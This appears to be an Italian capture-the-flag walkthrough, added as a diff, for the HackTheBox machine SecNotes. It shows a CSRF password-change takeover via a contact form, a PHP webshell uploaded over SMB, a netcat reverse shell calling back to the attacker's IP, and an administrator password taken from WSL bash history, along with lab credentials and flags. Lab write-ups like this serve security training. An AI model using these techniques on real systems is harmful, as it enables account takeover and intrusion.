@@ -1,0 +1,411 @@
+10.10.10.97
+
+84/tcp   filtered ctf
+445/tcp  open     microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open     http         Microsoft IIS httpd 10.0
+
+
+
+
+PORT 80:
+
+http://10.10.10.97/login.php    ----> login 
+
+No account found with that username.    ---> partial information disclosure
+
+
+visto che non riesco ad accedere (guessing, ho provato sql injection) provo a creare un account
+
+http://10.10.10.97/register.php
+
+daerves:password
+
+http://10.10.10.97/home.php
+
+
+Viewing Secure Notes for daerves
+
+posso creare note
+
+in contact us:
+
+tyler@secnotes.htb          ----> username, lo testo sulla pagina di login  ------> The password you entered was not valid. ------> USERNAME VALIDO tyler
+
+
+dalla source della pagina:
+
+<div class="alert alert-warning">
+	  Due to GDPR, all users must delete any notes that contain Personally Identifable Information (PII)<br/>Please contact <strong>tyler@secnotes.htb</strong> using the contact link below with any questions.	</div>
+    <div class="page-header">
+
+può essere che c'è "qualcuno" che legge le note, magari posso provare una sorta di client side attack?
+
+per delete della nota:
+
+<a href=/home.php?action=delete&id=8">
+
+quindi se riesco a cambiare id della nota visualizzata riesco ad accedere anche ad altre note? sembrano avbere un id progressivo
+
+visto che nell'url non compare posso provare con burp ?
+
+nella request:
+
+PHPSESSID=nc1ukiuehrvroj6503h68hba7b
+
+title=id&note=idid&submit=Save
+
+
+
+POST /change_pass.php HTTP/1.1
+Host: 10.10.10.97
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Origin: http://10.10.10.97
+DNT: 1
+Connection: close
+Referer: http://10.10.10.97/change_pass.php
+Cookie: PHPSESSID=nc1ukiuehrvroj6503h68hba7b
+Upgrade-Insecure-Requests: 1
+
+password=password1&confirm_password=password1&submit=submit
+
+
+il change pass non controlla la password precedente, richiede solo quella nuova 
+
+
+
+
+non riesco a decodificare il phpsessid e le note vengono caricate in base a quello quindi non riesco ad accedere alle note di tyler (se ne ha)
+potrei provare a fare bruteforce sulla login ora che conosco l'username
+
+prima però provo a vedere se riesco a collegarmi a SMB per ottenere qualcosa (o caricare qualcosa )
+
+PORT 445:
+
+non riesco ad accedere ma anche in questo caso c'è user tyler
+
+└──╼ $smbclient -L //10.10.10.97
+Enter WORKGROUP\daerves's password: 
+session setup failed: NT_STATUS_ACCESS_DENIED
+┌─[✗]─[daerves@daerves-x302ua]─[~/Desktop/SecNotes/htb/oscp_like/secnotes]
+└──╼ $smbclient -L //10.10.10.97 -U tyler
+Enter WORKGROUP\tyler's password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+
+
+
+quindi in qualche modo devo accedere a tyler
+
+
+vedo solo tre modi:
+
+1- bruteforce ( o su smb o sul login del sito )
+2- client side attack sulle note (rileggendo l'avviso dice che l'utente deve ri,muovere le note con dati personali, non che le rimuove il sito quindi non penso che funzionerebbe )
+3- client side attack tramite form di contact us
+
+prima di provare bruteforce provo l'alternativa 3: cerco di far cliccare a tyler un link per fargli cambiare la password 
+però è una richiesta POST quindo non ci sono i parametri nell'url 
+
+
+se al posto di usare una POST mando i paramtri con una GET se li prende comunque:
+
+GET /change_pass.php?password=password2&confirm_password=password2&submit=submit
+
+e infatti ora ho daerves:password2 
+
+quindi l'url per l'attacco sarebbe:
+
+
+http://10.10.10.97/change_pass.php?password=password2&confirm_password=password2&submit=submit
+
+provo a mandarlo nel form del contact us
+
+
+funziona! 
+
+pochi secondi dopo ottengo l'accesso con:
+
+tyler:password2
+
+NOTE INTERESSANTI:
+
+YEARS
+    1957, 1982, 1993, 2005, 2009*, and 2017
+
+
+new site
+    \\secnotes.htb\new-site
+    tyler / 92g!mA8BGjOirkL%OG*&
+
+
+quindi effettivamente c'è un vhost e c'è anche una password che forse mi fa accedere a smb:
+
+yes
+
+┌─[✗]─[daerves@daerves-x302ua]─[~/Desktop/SecNotes/htb/oscp_like/secnotes]
+└──╼ $smbclient -L //10.10.10.97 -U tyler
+Enter WORKGROUP\tyler's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	new-site        Disk      
+SMB1 disabled -- no workgroup available
+┌─[daerves@daerves-x302ua]─[~/Desktop/SecNotes/htb/oscp_like/secnotes]
+└──╼ $
+
+mi collego allo share new-site:
+
+
+┌─[daerves@daerves-x302ua]─[~/Desktop/SecNotes/htb/oscp_like/secnotes]
+└──╼ $smbclient //10.10.10.97/new-site -U tyler
+Enter WORKGROUP\tyler's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Aug 19 20:06:14 2018
+  ..                                  D        0  Sun Aug 19 20:06:14 2018
+  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
+
+		7736063 blocks of size 4096. 3377224 blocks available
+smb: \> 
+
+
+
+non ci sono files interessanti, il file .htm è la home page di default del server IIS 
+
+però sulla pagina 8808 la macchina ha proprio un webserver IIS, potrebbe essere che questa share di smb è la root directory del server
+
+provo se ho write permission;
+
+└──╼ $smbclient //10.10.10.97/new-site -U tyler
+Enter WORKGROUP\tyler's password: 
+Try "help" to get a list of possible commands.
+smb: \> put prova.txt
+putting file prova.txt as \prova.txt (0,0 kb/s) (average 0,0 kb/s)
+smb: \> dir
+  .                                   D        0  Tue Jul  5 20:50:33 2022
+  ..                                  D        0  Tue Jul  5 20:50:33 2022
+  iisstart.htm                        A      696  Thu Jun 21 17:26:03 2018
+  iisstart.png                        A    98757  Thu Jun 21 17:26:03 2018
+  prova.txt                           A        0  Tue Jul  5 20:50:33 2022
+
+
+si
+
+
+
+ora provo a raggiungere il file
+
+http://10.10.10.97:8808/prova.txt
+
+lo raggiungo
+
+
+ora visto che l'altro sito era in php posso provare a mettere una piccola webshell php in smb e poi eseguirla dal browser
+
+con php-reverse-shell.php funziona anche se si interrompe subito:
+
+nc -lvnp 1234
+ùlistening on [any] 1234 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.97] 50353
+'uname' is not recognized as an internal or external command,
+operable program or batch file.
+
+perchè giustamente la shell è per linux:
+
+$shell = 'uname -a; w; id; /bin/sh -i'
+
+alla fine funzuiona una shell molto piu facile:
+
+easy_php_webshell.php
+
+cosi posso eseguire comandi 
+
+whoami:
+secnotes\tyler
+
+smb: \> put nc64.exe 
+putting file nc64.exe as \nc64.exe (193,1 kb/s) (average 50,8 kb/s)
+
+
+e poi do come comando:
+
+
+
+cmd.exe /c nc64.exe -e cmd.exe 10.10.14.10 1234
+
+
+ottengo reverse shell come tyler:
+
+
+c:\Users\tyler\Desktop>type user.txt
+type user.txt
+8961f542a5d2a342c8225ef329fc6079
+
+ora privesc 
+
+
+
+
+C:\inetpub\new-site>whoami
+whoami
+secnotes\tyler
+
+C:\inetpub\new-site>whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
+
+C:\inetpub\new-site>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State  
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
+
+
+sotto c:\ c'è un file .zip:
+
+c:\Users\tyler\Desktop>cd c:\
+cd c:\
+
+c:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1E7B-9B76
+
+ Directory of c:\
+
+06/21/2018  03:07 PM    <DIR>          Distros
+06/21/2018  06:47 PM    <DIR>          inetpub
+06/22/2018  02:09 PM    <DIR>          Microsoft
+04/11/2018  04:38 PM    <DIR>          PerfLogs
+06/21/2018  08:15 AM    <DIR>          php7
+01/26/2021  03:39 AM    <DIR>          Program Files
+01/26/2021  03:38 AM    <DIR>          Program Files (x86)
+06/21/2018  03:07 PM       201,749,452 Ubuntu.zip
+06/21/2018  03:00 PM    <DIR>          Users
+01/26/2021  03:38 AM    <DIR>          Windows
+               1 File(s)    201,749,452 bytes
+               9 Dir(s)  13,915,672,576 bytes free
+
+
+Ubuntu.zip
+
+
+lo scarico usando smbserver
+
+non si riesce a scaricare 
+
+potrebbe essere che Ubuntu.zip sia un backup per WSL (Windows Subsystem for Linux) 
+
+per controllare se effettivamente è stato installato:
+
+PS C:\> Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss
+Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss
+
+
+    Hive: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss
+
+
+Name                           Property                                                                                
+----                           --------                                                                                
+{02893575-609c-4e3b-a426-00f9d State             : 1                                                                   
+9b271da}                       DistributionName  : Ubuntu-18.04                                                        
+                               Version           : 1                                                                   
+                               BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState                                                              
+                               PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc     
+
+il base path è:
+
+C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState
+
+
+posso provare a cercare se c'è qualcosa di interessante nel filesystem linux:
+
+
+
+effettivamente trovo la password di administrator:
+
+
+PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> type .bash_history
+type .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+> .bash_history 
+less .bash_history
+exit
+PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root>
+
+
+
+administrator%u6!4ZwgwOM#^OBf#Nwnh
+
+
+provo ad accedere usando as esempio psexec
+
+sudo python3 psexec.py administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97
+
+non riesco, visto che le credenziali però sono di smb uso lo stesso comando smbclient per accedere allo share c$ 
+cambio solo ip 
+
+
+smb: \users\administrator\desktop\> dir
+  .                                  DR        0  Tue Jan 26 11:39:01 2021
+  ..                                 DR        0  Tue Jan 26 11:39:01 2021
+  desktop.ini                       AHS      282  Sun Aug 19 19:01:17 2018
+  Microsoft Edge.lnk                  A     1417  Sat Jun 23 01:45:06 2018
+  root.txt                           AR       34  Tue Jul  5 20:40:15 2022
+
+		7736063 blocks of size 4096. 3396413 blocks available
+smb: \users\administrator\desktop\> type root.txt
+type: command not found
+smb: \users\administrator\desktop\> get root.txt
+getting file \users\administrator\desktop\root.txt of size 34 as root.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+smb: \users\administrator\desktop\> 
+
+
+d6dc866c38c59024276bc77e8eca57b0
